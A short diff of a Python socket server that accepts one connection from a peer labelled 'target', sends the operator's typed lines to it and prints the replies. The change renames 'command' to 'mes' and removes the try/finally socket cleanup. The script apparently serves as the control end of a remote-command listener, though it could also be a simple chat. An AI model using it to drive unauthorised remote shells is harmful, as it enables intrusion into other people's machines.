@@ -9,16 +9,15 @@ s.listen(1)
 target, ip = s.accept()
 print("Connection received from: ", ip)
 
-try:
-    while True:
-        command = input(f">>> {ip}: ")
-        if command.strip().lower() == "exit":
-            target.send(command.encode())
-            print("Exiting...")
-            break
-        target.send(command.encode())
+
+while True:
+    mes = input(f">>> {ip}: ")
+    if mes.strip().lower() == "exit":
+        target.send(mes.encode())
+        print("Exiting...")
+        break
+    else:
+        target.send(mes.encode())
         res = target.recv(1024)
         print("Client:", res.decode())
-finally:
-    target.close()
-    s.close()
+
